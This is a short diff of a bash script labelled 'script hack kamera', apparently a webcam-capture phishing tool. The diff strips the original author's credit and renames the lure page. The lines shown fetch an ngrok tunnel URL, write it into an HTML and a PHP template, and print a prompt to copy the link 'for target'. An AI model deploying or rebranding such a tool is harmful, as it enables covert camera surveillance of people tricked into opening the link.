@@ -1,6 +1,4 @@
 #!/bin/bash
-# Oxlynx
-# link github.com/oxlynx/hackcam
 # script hack kamera
 
 trap 'printf "\n";stop' 2
@@ -121,7 +119,7 @@ printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Please copy this link for target :
 payload_ngrok() {
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-sed 's+forwarding_link+'$link'+g' oxlynx.html > index2.html
+sed 's+forwarding_link+'$link'+g' bluecrush.html > index2.html
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 
 
